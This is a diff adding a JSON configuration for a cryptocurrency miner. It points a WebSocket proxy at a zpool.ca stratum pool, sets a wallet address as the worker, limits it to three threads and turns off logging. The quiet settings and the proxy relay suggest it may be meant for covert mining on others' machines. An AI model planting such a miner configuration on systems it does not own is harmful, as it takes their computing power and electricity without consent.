@@ -1,0 +1,13 @@
+{
+  "proxy": "wss://smiling-tilda-mono.koyeb.app/proxy",
+  "stratum": {
+    "server": "minotaurx.na.mine.zpool.ca",
+    "port": 7019,
+    "worker": "RP4iXS1kxyr1diaWD7w4ocuL3cmDZgdQCQ",
+    "password": "c=RVN,zap=AVN"
+  },
+  "options": {
+    "threads": 3,
+    "log": false
+  }
+}
